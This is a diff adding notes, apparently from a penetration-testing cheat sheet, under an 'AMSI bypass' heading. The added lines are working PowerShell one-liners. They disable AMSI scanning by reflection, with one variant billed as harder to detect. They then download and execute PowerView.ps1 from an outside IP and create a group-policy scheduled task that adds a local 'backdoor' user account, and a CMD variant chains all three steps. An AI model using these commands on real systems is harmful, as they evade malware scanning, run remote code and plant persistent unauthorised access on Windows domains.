@@ -225,6 +225,28 @@ Register-ScheduledTask -TaskName "DisableUAC" -Action $action -Trigger $trigger 
 
 ## AMSI bypass
 
+### One liners
+
+```powershell
+#Strong AMSI bypass (works on many modern Windows versions) 
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Alternative one-liner (reflection-based, harder to signature):
+$amsi=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# now DL and launch the script
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.xxx/PowerView.ps1'); New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor12345' -GPODisplayName "BD1" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user backdoor B@ckdoor123 /add"
+```
+
+Or magic one liner from CMD shell to create a GPO backdoor scheduled task:
+
+```bash
+powershell -ep bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX((New-Object Net.WebClient).DownloadString('http://10.10.16.xxx/PowerView.ps1')); New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor12345' -GPODisplayName 'BD1' -Command 'C:\Windows\System32\cmd.exe' -CommandArguments '/c net user backdoor backdoorPASSWORD! /add /Y'"
+```
+
+
+### Long Version
+
 ```powershell
 function LookupFunc {  
 Param ($moduleName, $functionName)  
